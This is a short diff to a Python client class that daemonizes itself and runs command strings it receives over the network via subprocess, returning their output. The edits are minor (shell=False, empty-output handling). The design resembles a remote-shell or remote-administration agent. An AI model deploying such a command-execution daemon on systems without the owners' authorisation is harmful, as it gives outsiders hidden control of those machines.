@@ -17,7 +17,7 @@ class client:
     port = 3000
 
     def __init__(self):
-        # deamonize the process
+        # deamonize the process, comment this line out when debugging
         self.daemonize()
 
         # acquire process lock so only one instance of the daemon can exist at a time
@@ -129,15 +129,14 @@ class client:
             try:
                 cmd = cmd[:].decode("utf-8")
                 cmd = cmd.split(" ")
-                result = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                result = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 result_in_bytes = result.stdout.read() + result.stderr.read()
                 result_in_string = str(result_in_bytes, "utf-8")
+                if len(result_in_string) == 0:
+                    result_in_string = "\n"
                 return result_in_string
             except Exception as error:
                 return str(error) + "\n"
-
-        # this means the command is empty, returns no result in this case
-        return "\n"
 
 
 if  __name__ ==  '__main__':
